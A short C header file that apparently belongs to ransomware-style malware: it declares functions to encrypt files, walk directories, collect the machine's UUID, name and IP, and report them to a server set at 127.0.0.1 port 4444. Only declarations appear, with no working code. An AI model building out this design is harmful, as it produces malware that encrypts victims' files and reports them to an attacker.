#ifndef FUNCS_H_INCLUDED
	#define FUNCS_H_INCLUDED

	#define myhost "127.0.0.1"
	#define myport 4444

	//send information to server
	void connectserver(char *uuid, char *hostname);

	void encryptfile(char *file_to_encrypt);

	void WhatIsDir(char *name_dir);

	char *getuuid(void);

	char *getpcname(void);

	char *getip(void);

#endif
